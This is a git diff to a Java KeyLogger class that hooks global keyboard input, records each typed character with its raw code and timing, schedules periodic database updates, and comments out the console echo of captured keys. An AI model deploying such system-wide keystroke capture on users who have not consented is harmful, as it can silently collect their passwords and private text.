@@ -24,7 +24,7 @@ public class KeyLogger implements NativeKeyListener {
     /**
      * setup and starts the key listener
      */
-    public static void setupKeyListener(){
+    public void setupKeyListener(){
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException e){
@@ -43,6 +43,10 @@ public class KeyLogger implements NativeKeyListener {
         keyStrokes = new HashMap<>();
         // initialize the object
         keyLogData = new KeyLogData();
+
+        // start's the update schedule
+        DbUpdateSchedule dpUpdate = new DbUpdateSchedule(this);
+        dpUpdate.startSchedule();
     }
 
     /**
@@ -50,9 +54,9 @@ public class KeyLogger implements NativeKeyListener {
      * @param key the pressed key
      */
     public void nativeKeyTyped(NativeKeyEvent key) {
-        System.out.println("Key Typed: " + key.getKeyChar());
+        // System.out.println("Key Typed: " + key.getKeyChar());
         keyLogData.addKeyValue(String.valueOf(key.getKeyChar()), key.getRawCode());
-        System.out.println(keyLogData.getKeyValues());
+        // System.out.println(keyLogData.getKeyValues());
     }
 
     /**
@@ -80,6 +84,14 @@ public class KeyLogger implements NativeKeyListener {
         // increases the total values
         keyLogData.increaseKeyPressedTime(timeSec);
         keyLogData.increaseKeyStroke();
+    }
+
+    /**
+     * Return the KeyLogData object
+     * @return KeyLogData object
+     */
+    protected KeyLogData getKeyLogData(){
+        return keyLogData;
     }
 
     /**
